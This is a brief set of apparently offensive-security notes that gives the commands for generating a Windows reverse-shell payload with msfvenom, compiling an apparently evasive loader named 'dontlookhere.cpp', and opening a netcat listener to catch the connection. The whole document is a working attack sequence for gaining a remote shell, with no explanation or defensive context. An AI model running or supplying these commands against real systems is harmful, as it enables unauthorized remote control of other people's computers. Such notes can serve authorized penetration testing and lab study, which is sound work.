## msfvenom payload

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<an IP here> LPORT=9001 -f raw -o ./Desktop/reverse_shell.bin
```

```pwsh
.\compile.bat dontlookhere.cpp
```

```sh
rlwrap nc -lvnp 9001
```